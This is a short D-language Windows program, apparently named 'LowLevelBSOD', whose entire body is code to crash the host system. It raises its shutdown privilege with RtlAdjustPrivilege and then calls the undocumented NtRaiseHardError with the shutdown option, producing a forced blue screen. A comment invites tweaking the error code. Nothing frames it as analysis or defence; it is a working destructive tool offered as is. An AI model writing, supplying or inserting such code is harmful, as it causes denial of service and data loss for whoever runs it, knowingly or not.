module D_Lang_LowLevelBSOD;

import core.sys.windows.windows;
pragma(lib , "ntdll.lib");
alias extern(C) int function(string[] args) MainFunc;
extern (C) int _d_run_main(int argc, char **argv, MainFunc mainFunc);

extern (Windows)
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    return _d_run_main(0, null, &main); // arguments unused, retrieved via CommandLineToArgvW
}

extern(C) int main(string[] args)
{
  //  MessageBoxW(null, "Hello D World!"w.ptr, "D Windows Application"w.ptr, MB_OK);

    bool Resp;
    uint RespOnse;
// 19 for SE_ShutDOWN_PRIVILEGE
    int errorCode  = 0xC0000022; //you can change it
    RtlAdjustPrivilege(19 , true , false , Resp);

    NtRaiseHardError(errorCode , 0,0,0,6 , RespOnse );
    return 0;
}
extern(Windows) int RtlAdjustPrivilege(int Priv_To_Enable ,bool Enable , bool WasEnable , out bool response );
extern(Windows) int NtRaiseHardError(int ErrorCode , int n , int j , int k ,  int m , out uint response);